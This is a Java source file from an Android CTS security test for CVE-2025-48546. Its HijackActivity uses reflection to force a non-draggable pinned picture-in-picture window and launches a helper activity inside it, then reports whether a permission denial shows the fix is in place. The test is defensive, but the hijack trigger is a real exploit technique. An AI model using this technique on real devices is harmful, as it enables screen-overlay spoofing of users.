/*
 * Copyright (C) 2026 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2025_48546;

import android.app.Activity;
import android.app.ActivityOptions;
import android.app.WindowConfiguration;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import java.lang.reflect.Field;

public class HijackActivity extends Activity {
    private Handler mHandler = null;

    @Override
    protected void onResume() {
        try {
            super.onResume();

            // Create a mHandler to schedule the launch of 'HelperHijackActivity'.
            mHandler = new Handler(Looper.getMainLooper());

            // Fetch the private field 'KEY_LAUNCH_WINDOWING_MODE' from 'ActivityOptions'.
            final Field keyLaunchWindowingModeField =
                    ActivityOptions.class.getDeclaredField("KEY_LAUNCH_WINDOWING_MODE");
            keyLaunchWindowingModeField.setAccessible(true);
            final String keyLaunchWindowingMode = (String) keyLaunchWindowingModeField.get(null);

            // Set 'KEY_LAUNCH_WINDOWING_MODE' to 'WINDOWING_MODE_PINNED' to create a
            // 'non-draggable' PiP.
            final Bundle windowBundle = new Bundle();
            windowBundle.putInt(
                    keyLaunchWindowingMode, WindowConfiguration.WINDOWING_MODE_PINNED /* value */);

            // Schedule the 'startActivity' call to run after 5 seconds.
            mHandler.postDelayed(
                    () -> {
                        // Ensure the 'HijackActivity' is still running and not finishing
                        // before starting the 'HelperHijackActivity'.
                        if (!isFinishing()) {
                            // Start 'HelperHijackActivity' inside a 'non-draggable' PiP window.
                            try {
                                startActivity(
                                        new Intent(
                                                getApplicationContext(),
                                                HelperHijackActivity.class),
                                        windowBundle);
                            } catch (Exception e) {
                                try {
                                    // Send a broadcast to 'DeviceTest' if a 'SecurityException'
                                    // occurs indicating that the fix is present and that the
                                    // device is not vulnerable.
                                    if (e instanceof SecurityException
                                            && e.getMessage().contains("Permission Denial")) {
                                        sendBroadcast(
                                                new Intent("CVE_2025_48546_action")
                                                        .putExtra("vulnerableStatus", false));
                                    }
                                } catch (Exception exception) {
                                    Log.e(
                                            "CVE_2025_48546",
                                            "Exception occurred in HijackActivity: "
                                                    + exception.getMessage());
                                }
                            }
                        }
                    },
                    5_000L /* delayMillis */);
        } catch (Exception e) {
            Log.e("CVE_2025_48546", "Exception occurred in HijackActivity: " + e.getMessage());
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Clear the 'MessageQueue' of 'mHandler'.
        if (mHandler != null) {
            mHandler.removeCallbacksAndMessages(null);
        }
    }
}
